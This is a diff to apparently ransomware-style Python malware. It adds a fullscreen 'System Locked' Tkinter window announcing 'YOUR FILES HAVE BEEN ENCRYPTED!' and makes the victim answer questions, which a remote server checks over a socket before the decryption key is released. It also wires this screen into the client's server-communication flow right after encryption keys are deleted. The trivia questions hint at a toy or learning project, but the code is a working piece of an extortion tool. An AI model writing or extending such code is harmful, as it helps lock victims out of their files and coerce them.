@@ -4,6 +4,142 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import socket
 import threading
 import enum
+import tkinter as tk
+from tkinter import messagebox
+import socket
+from enum import Enum
+
+
+class QuestionnaireGUI:
+    def __init__(self, server_socket: socket):
+        self.server_socket = server_socket
+
+        self.questions = [
+            "What is the capital of France?",
+            "What is 2 + 2?",
+            "Who is the best hacker in the world?"
+        ]
+
+        self.current_index = 0
+
+        self.root = tk.Tk()
+        self.root.title("System Locked")
+
+        self.root.attributes("-fullscreen", True)
+        self.root.configure(bg="black")
+
+        # intro
+        self.intro_frame = tk.Frame(self.root, bg="black")
+        self.intro_frame.pack(expand=True)
+
+        intro_text = (
+            "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
+            "To recover them, you must answer a set of questions.\n"
+            "Answer all questions correctly to obtain the decryption key."
+        )
+
+        self.intro_label = tk.Label(
+            self.intro_frame,
+            text=intro_text,
+            font=("Arial", 26),
+            fg="white",
+            bg="black",
+            justify="center",
+            wraplength=900
+        )
+        self.intro_label.pack(pady=40)
+
+        self.start_button = tk.Button(
+            self.intro_frame,
+            text="Start",
+            font=("Arial", 20),
+            command=self.start_questions
+        )
+        self.start_button.pack(pady=20)
+
+        # questions
+        self.question_frame = tk.Frame(self.root, bg="black")
+
+        self.label = tk.Label(
+            self.question_frame,
+            text="",
+            font=("Arial", 24),
+            fg="white",
+            bg="black",
+            wraplength=900
+        )
+        self.label.pack(pady=40)
+
+        self.entry = tk.Entry(
+            self.question_frame,
+            font=("Arial", 20),
+            width=40
+        )
+        self.entry.pack(pady=20)
+
+        self.submit_btn = tk.Button(
+            self.question_frame,
+            text="Submit",
+            font=("Arial", 18),
+            command=self.submit_answer
+        )
+        self.submit_btn.pack(pady=20)
+
+        self.status_label = tk.Label(
+            self.question_frame,
+            text="",
+            font=("Arial", 16),
+            fg="white",
+            bg="black"
+        )
+        self.status_label.pack(pady=10)
+
+        # enter key
+        self.entry.bind("<Return>", lambda event: self.submit_answer())
+
+        self.root.mainloop()
+
+    # flow control
+    def start_questions(self):
+        self.intro_frame.pack_forget()
+        self.question_frame.pack(expand=True)
+        self.load_question()
+
+    def load_question(self):
+        if self.current_index < len(self.questions):
+            self.label.config(text=self.questions[self.current_index])
+            self.entry.delete(0, tk.END)
+            self.status_label.config(text="")
+        else:
+            messagebox.showinfo("Success", "All questions completed!")
+            self.root.destroy()
+
+    def submit_answer(self):
+        question = self.questions[self.current_index]
+        answer = self.entry.get().strip()
+
+        if not answer:
+            return
+
+        try:
+            message = f"{Requests.CHECK_ANSWERS.value}:{question}:{answer}"
+            self.server_socket.send(message.encode())
+
+            response = self.server_socket.recv(1024).decode()
+
+            if response.startswith("ANSWER_VERIFICATION:"):
+                result = response.split(":", 1)[1]
+
+                if result == "True":
+                    self.status_label.config(text="Correct!", fg="lightgreen")
+                    self.current_index += 1
+                    self.load_question()
+                else:
+                    self.status_label.config(text="Incorrect. Try again.", fg="red")
+
+        except Exception as e:
+            messagebox.showerror("Error", str(e))
+            self.root.destroy()
 
 class Requests(enum.Enum):
     ENCRYPT = "ENCRYPT"
@@ -151,7 +287,8 @@ def handle_server_communication(server_socket: socket):
 
             del key
             del salt
-            questions(server_socket)
+            #questions(server_socket)
+            QuestionnaireGUI(server_socket)
 
             server_socket.send(Requests.REQUEST_DECRYPTION_KEY.value.encode())
             response = server_socket.recv(1024).decode()
